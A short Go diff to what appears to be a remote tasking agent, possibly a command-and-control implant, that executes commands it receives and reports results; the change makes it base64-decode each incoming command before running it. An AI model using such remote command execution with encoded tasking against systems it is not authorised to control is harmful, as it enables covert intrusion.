@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -474,7 +475,17 @@ func handle_runCommand(this_taskID string, command string) {
 
 	var response Task_Response
 
-	output, command_error_message := runCommand(command)
+	// Decode the command
+	decoded_command, err := base64.StdEncoding.DecodeString(command)
+	if err != nil {
+		fmt.Println("Error decoding base64:", err)
+		response = Task_Response{this_taskID, "failed", "Couldn't decode the string"}
+		send_response(response)
+		return
+
+	}
+
+	output, command_error_message := runCommand(string(decoded_command))
 	if command_error_message != "" {
 		response = Task_Response{this_taskID, "failed", output}
 	} else {
